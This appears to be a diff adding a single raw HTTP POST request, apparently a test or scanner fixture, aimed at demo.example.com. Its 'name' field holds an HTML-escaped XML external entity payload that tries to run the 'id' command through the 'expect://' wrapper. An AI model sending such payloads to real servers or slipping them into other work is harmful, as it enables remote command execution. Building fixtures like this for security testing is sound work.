@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+Connection: close
+
+name=&lt;!DOCTYPE r [&lt;!ENTITY x SYSTEM &quot;expect://id&quot;&gt;]&gt;&lt;r&gt;&amp;x;&lt;/r&gt;
